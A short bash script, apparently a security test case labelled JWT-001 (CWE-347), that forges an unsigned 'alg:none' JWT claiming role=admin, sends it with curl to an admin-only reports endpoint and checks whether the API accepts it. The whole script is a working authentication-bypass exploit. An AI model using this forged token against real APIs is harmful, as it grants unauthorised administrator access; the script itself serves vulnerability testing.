#!/usr/bin/env bash
# JWT-001 (CWE-347): a forged alg:none token with role=admin is accepted by the
# API bearer path, reaching an admin-only report.
set -e; . "$(dirname "$0")/_lib.sh"
H=$(b64url '{"alg":"none","typ":"JWT"}')
P=$(b64url '{"sub":"forged","role":"admin","orgId":"x","email":"e"}')
curl -s -H "Authorization: Bearer $H.$P." "$TARGET/api/reports/admin-summary" | grep -q 'admin-summary'
